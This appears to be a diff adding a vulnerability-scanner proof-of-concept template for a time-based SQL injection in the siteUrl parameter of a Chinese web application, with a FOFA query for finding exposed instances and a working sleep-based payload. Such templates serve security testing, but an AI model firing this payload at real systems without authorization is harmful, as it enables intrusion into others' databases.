@@ -1,0 +1,23 @@
+id: poc-yaml-infinite-callback-system-siteUrl-sqli
+info:
+  name: 无限回调系统 siteUrl SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 无限回调系统
+  fofa: body="mb-5 web-font-desc"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /user/login.php
+  expression: status_code == 200 && contains(title,"无限回调系统")
+- method: POST
+  path: /user/ajax.php?act=siteadd
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: siteUrl=';select sleep({{.t1}})#'
+  expression: "status_code == 200 && \ncontains(body,\"\\\"code\\\":0\") &&\n!contains(body,\"\
+    <\") &&\nduration > t1 &&\nduration < t2\n"
+transport: http
